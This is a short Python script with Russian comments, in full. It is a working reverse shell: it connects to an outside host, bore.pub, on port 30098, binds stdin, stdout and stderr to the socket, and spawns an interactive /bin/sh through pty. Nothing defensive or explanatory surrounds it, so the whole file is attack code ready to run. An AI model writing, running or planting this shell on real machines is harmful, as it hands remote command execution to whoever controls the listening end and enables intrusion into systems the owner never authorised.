import socket
import subprocess
import os
import pty

HOST = "bore.pub"
PORT = 30098   # проверьте, что порт не изменился (посмотрите вывод bore)

print(f"[+] Connecting to {HOST}:{PORT}...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print("[+] Connected! Spawning PTY shell...")

    # Перенаправляем stdin, stdout, stderr
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # Спавним PTY-оболочку
    pty.spawn("/bin/sh")

except Exception as e:
    print(f"[-] Error: {e}")
